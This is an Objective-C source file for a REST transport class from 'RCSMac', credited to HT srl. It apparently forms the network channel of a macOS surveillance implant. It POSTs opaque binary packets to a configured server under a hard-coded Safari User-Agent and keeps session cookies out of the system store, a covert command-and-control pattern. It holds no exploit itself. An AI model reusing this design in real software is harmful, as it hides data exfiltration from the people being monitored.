/*
 * RCSMac - RESTTransport
 *  Transport implementation for REST Protocol.
 *
 *
 * Created by revenge on 13/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "RESTTransport.h"
#import "RCSMCommon.h"

//#define DEBUG_TRANSPORT
#define USER_AGENT @"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-us) AppleWebKit/534.16+ (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4"


@implementation RESTTransport

- (id)initWithURL: (NSURL *)aURL
           onPort: (int32_t)aPort
{
  if (self = [super init])
    {
#ifdef DEBUG_TRANSPORT
      infoLog(ME, @"host: %@", aURL);
      infoLog(ME, @"port: %d", aPort);
#endif
    
      if (aURL == nil)
        {
#ifdef DEBUG_TRANSPORT
          errorLog(ME, @"URL is null");
#endif
          
          [self release];
          return nil;
        }
      
      if (aPort <= 0)
        {
#ifdef DEBUG_TRANSPORT
          errorLog(ME, @"Port is invalid");
#endif
          
          [self release];
          return nil;
        }
    
      mURL    = [aURL copy];
      mCookie = nil;
      
      return self;
    }
  
  return nil;
}

- (void)dealloc
{
  [mURL release];
  [mCookie release];
  
  [super dealloc];
}

// Abstract Class Methods
- (BOOL)connect;
{
#ifdef DEBUG_TRANSPORT
  infoLog(ME, @"URL: %@", mURL);
#endif
  
  return YES;
}

- (BOOL)disconnect
{
  return YES;
}
// End Of Abstract Class Methods

- (NSData *)sendData: (NSData *)aPacketData
   returningResponse: (NSURLResponse *)aResponse
{
#ifdef DEBUG_TRANSPORT
  infoLog(ME, @"aPacketData: %@", aPacketData);
  infoLog(ME, @"mURL: %@", mURL);
#endif
  
  NSMutableURLRequest *urlRequest = [[NSMutableURLRequest alloc] initWithURL: mURL];
  NSData *replyData;
  
  [urlRequest setTimeoutInterval: 10];
  [urlRequest setHTTPMethod: @"POST"];
  [urlRequest setHTTPBody: aPacketData];
  [urlRequest setValue: @"application/octet-stream"
    forHTTPHeaderField: @"Content-Type"];
  [urlRequest setValue: USER_AGENT
    forHTTPHeaderField: @"User-Agent"];
  
  //
  // Avoid to store cookies in the cookie manager
  //
  [urlRequest setHTTPShouldHandleCookies: NO];
  
  if (mCookie != nil)
    {
#ifdef DEBUG_TRANSPORT
      infoLog(ME, @"cookie available: %@", mCookie);
#endif
      [urlRequest setValue: mCookie
        forHTTPHeaderField: @"Cookie"];
    }
  
  replyData = [NSURLConnection sendSynchronousRequest: urlRequest
                                    returningResponse: &aResponse
                                                error: nil];
  [urlRequest release];
  
  if (aResponse == nil)
    {
#ifdef DEBUG_TRANSPORT
      errorLog(ME, @"Error while connecting");
#endif
      
      return NO;
    }
  
  NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)aResponse;
  NSDictionary *headerFields = [httpResponse allHeaderFields];
  
  // Handle cookie
  NSString *cookie = [headerFields valueForKey: @"Set-Cookie"];
  
  if (cookie != nil)
    {
#ifdef DEBUG_TRANSPORT
      infoLog(ME, @"Got a cookie, yuppie");
      infoLog(ME, @"Cookie: %@", cookie);
#endif
      
      if (mCookie != nil)
        [mCookie release];
      
      mCookie = [cookie copy];
    }
  
  int statusCode = [httpResponse statusCode];

#ifdef DEBUG_TRANSPORT
  infoLog(ME, @"reply statusCode: %d", statusCode);
#endif
  
  if (statusCode == 200)
    return replyData;
  else
    return nil;
}

@end